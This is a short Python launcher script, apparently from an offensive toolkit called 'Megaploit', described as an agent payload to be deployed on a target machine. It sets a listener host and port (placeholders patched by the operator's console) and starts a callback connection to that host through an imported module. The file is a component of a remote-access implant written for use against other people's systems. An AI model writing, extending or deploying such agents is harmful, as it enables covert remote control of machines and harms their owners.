#!/usr/bin/env python3
"""
agent.py — Megaploit agent payload.

Deploy this file (plus secret.key) on the target machine, then run:
    python agent.py

The LHOST / PORT constants below are patched automatically by the server
when you run  generate  (or  generate -c  for byte-compilation) from the
Megaploit console.
"""

import sys
from megaploit.agent.connection import start

# ---------------------------------------------------------------------------
# Configuration — patched by the server console before deployment
# ---------------------------------------------------------------------------
LHOST = "127.0.0.1"; PORT = 4444  # patched by server


if __name__ == "__main__":
    # Patch the imported module's globals so connection.py picks them up
    import megaploit.agent.connection as _conn
    _conn.LHOST = LHOST
    _conn.PORT  = PORT
    try:
        start()
    except KeyboardInterrupt:
        sys.exit(0)
